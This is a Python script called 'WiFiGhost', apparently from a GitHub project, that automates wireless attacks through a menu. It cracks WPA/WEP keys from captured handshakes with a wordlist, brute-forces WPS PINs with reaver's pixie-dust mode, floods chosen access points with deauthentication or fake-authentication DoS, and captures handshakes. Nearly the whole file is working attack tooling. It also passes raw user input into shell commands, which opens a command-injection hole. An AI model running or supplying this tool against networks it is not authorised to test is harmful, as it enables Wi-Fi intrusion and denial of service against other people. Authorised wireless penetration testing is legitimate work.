#!/bin/python3
# -*- coding: utf-8 -*-

# This is a Python script for Linux systems to automate wireless auditing
# Required tools: aircrack-ng, aireplay-ng, reaver, pixiewps, airmon-ng, iw, iwconfig
# Coded by parsa kazazi
# GitHub: https://github.com/parsa-kazazi

import os
import subprocess
import sys
import time

red = "\033[91m"
green = "\033[92m"
cyan = "\033[96m"
unset_color = "\033[0m"

os.system("clear && printf '\033]2;WiFiGhost\a'")

print("\n [ WiFiGhost : Automate wireless auditing script ]\n")
time.sleep(2)
print(cyan + "######################### Start #########################" + unset_color + "\n")
sys.stdout.write("Root permission : ")

if subprocess.getoutput("id -u") != "0":
    sys.stdout.write(red + "NO" + unset_color + "\n")
    print("This script needs root permission.")
    print("re-run as sudo. exiting.\n")
    exit()
else:
    sys.stdout.write(green + "OK" + unset_color + "\n\n")
print("Checking required tools.\n")

required_tools = ["aircrack-ng", "aireplay-ng", "reaver", "pixiewps", "airmon-ng", "iw", "iwconfig", "xterm"]
not_found_tools = 0

for tool in required_tools:
    time.sleep(0.5)
    if "not found" in subprocess.getoutput(tool + " --help"):
        print(tool + " ... " + red + "Not found" + unset_color)
        not_found_tools += 1
    else:
        print(tool + " ... " + green + "Found: " + unset_color + subprocess.getoutput("which " + tool))

if not_found_tools >= 1:
    print("\n" + str(not_found_tools) + " tool(s) was not found. script can't continue.\n")
    exit()
else:
    print("\nAll required tools found.\n")

input("Press Enter to continue... ")
print("\n" + cyan + "####################### Interface #######################\n" + unset_color)
print("Select an wireless interface to work with.\n")
print("IFACE               INFO")
print("--------------------------------------------")
print(subprocess.getoutput("iwconfig"))

interface = input("Interface name: ")

if "No such device" in subprocess.getoutput("iwconfig " + interface):
    print("\n" + interface + " : No such device.")
    print("Exiting.\n")
    exit()
elif "No such device" in subprocess.getoutput("iw " + interface + " info"):
    print("\n" + interface + " : Not a wireless interface.")
    print("Exiting.\n")
    exit()
elif " " in interface:
    print("\nInvalid input.\n")
    exit()
else:
    print("\n" + subprocess.getoutput("iw " + interface + " info"))

sys.stdout.write("\n\nEnabling monitor mode on interface " + green + interface + unset_color + " with " + green + "airmon-ng " + unset_color + "... ")
os.system("airmon-ng start " + interface + " > " + os.devnull)
sys.stdout.write(green + "enabled" + unset_color + "\n\n")
input("Press Enter to continue... ")
os.system("clear")

print(cyan + "####################### Main menu #######################" + unset_color + "\n")
print("Select an option:")
print("------------------------------")
print("""1- WPA/WEP key crack
2- WPS pin crack
3- DoS attack
4- Handshake capture
5- Exit
""")

try:
    option = int(input("Option number: "))
except ValueError:
    print("\nInvalid input.\n")
    exit()

if option not in [1, 2, 3, 4, 5]:
    print("\nInvalid input.\n")
    exit()
else:
    pass

def show_networks_list():
    os.system("xterm -title 'Networks list' -e 'airodump-ng " + interface + "'")

if option == 1:
    print("\n" + cyan + "##################### WPA/WEP crack #####################" + unset_color + "\n")

    q = input("Show networks list? (y/n) ")

    if q == "y" or q == "Y":
        show_networks_list()
    elif q == "n" or q == "N":
        pass
    else:
        print("Aborted.")
    
    target_essid = input("Target essid (AP name): ")
    handshake = input("Handshake file address: ")
    wordlist = input("Wordlist file (Enter to default): ")

    if wordlist == "":
        wordlist = "Files/rockyou.txt"
    time.sleep(2)

    if wordlist == "":
        print("\nRunning " + green + " aircrack-ng" + unset_color + " with " + green + "default" + unset_color + " wordlist.\n")
    else:
        print("\nRunning " + green + " aircrack-ng" + unset_color + " with '" + green + wordlist + unset_color + " wordlist.\n")
    
    time.sleep(3)
    os.system("aircrack-ng " + handshake + " -w " + wordlist + " -e " + target_essid)
    print("\nAttack finished. exiting.\n")
    exit()
elif option == 2:
    print("\n" + cyan + "####################### WPS crack #######################" + unset_color + "\n")
        
    q = input("Show networks list? (y/n) ")

    if q == "y" or q == "Y":
        show_networks_list()
    elif q == "n" or q == "N":
        pass
    else:
        print("Aborted.")
    
    target_bssid = input("Target bssid (mac address): ")

    print("\nRunning " + green + "reaver" + unset_color + " with bssid " + target_bssid + "\n")
    time.sleep(3)
    os.system("reaver -i " + interface + " -b " + target_bssid + " --pixie-dust -vv")
    print("\nAttack finished. exiting.\n")
    exit()
elif option == 3:
    print("\n" + cyan + "##################### DoS attacking #####################" + unset_color + "\n")
    print("Select attack mode:")
    print("------------------------------")
    print("1- DeAuth DoS attack")
    print("2- FakeAuth DoS attack")

    try:
        attack_mode = int(input("\nAttack mode (1 or 2): "))
    except ValueError:
        print("\nInvalid input.\n")
        exit()
    
    if attack_mode not in [1, 2]:
        print("\nInvalid input.\n")
        exit()
        
    q = input("Show networks list? (y/n) ")

    if q == "y" or q == "Y":
        show_networks_list()
    elif q == "n" or q == "N":
        pass
    else:
        print("Aborted.")
    
    if attack_mode == 1:
        target_bssid = input("Target bssid (mac address): ")

        try:
            deauth_count = int(input("DeAuth count: "))
        except ValueError:
            print("\nInvalid input.\n")
            exit()
        
        if deauth_count > 100000000000000000:
            print("\nDeAuth count too big.\n")
            exit()
        
        print("\nRunning " + green + "aireplay-ng" + unset_color + " , attack mode: DeAuth DoS attack")
        print("Press CTRL+C to finish attack.\n")
        time.sleep(5)
        os.system("aireplay-ng -a " + target_bssid + " --deauth " + str(deauth_count) + " " + interface)
        print("\nAttack finished. exiting.\n")
        exit()

    elif attack_mode == 2:
        target_bssid = input("Target bssid (mac address): ")

        try:
            fakeauth_count = int(input("FakeAuth count: "))
        except ValueError:
            print("\nInvalid input.\n")
            exit()
        
        if fakeauth_count > 100000000000000000:
            print("\nFakeAuth count too big.\n")
            exit()
        
        print("\nRunning " + green + "aireplay-ng" + unset_color + " , attack mode: FakeAuth DoS attack")
        print("Press CTRL+C to finish attack.\n")
        time.sleep(5)
        os.system("aireplay-ng -a " + target_bssid + " --fakeauth " + str(fakeauth_count) + " " + interface)
        print("\nAttack finished. exiting.\n")
        exit()

elif option == 4:
    print("\n" + cyan + "################### Handshake capture ###################" + unset_color + "\n")
            
    q = input("Show networks list? (y/n) ")

    if q == "y" or q == "Y":
        show_networks_list()
    elif q == "n" or q == "N":
        pass
    else:
        print("Aborted.")
    
    target_essid = input("Target essid (AP name): ")

    print("\nRunning " + green + "airodump-ng" + unset_color + " to capture handshake.")
    print("Press q to finish capture.\n")
    time.sleep(5)
    handshake_filename = "Handshake-" + target_essid
    os.mkdir("Handshake")
    os.system("airodump-ng --essid " + target_essid + " -w " + "Handshake/" + handshake_filename + " " + interface)
    print("\nCapture finished. handshake saved to directory: " + green + os.getcwd() + "/Handshake/" + unset_color + "\n")
    exit()
elif option == 5:
    print("\nExiting.\n")
    exit()
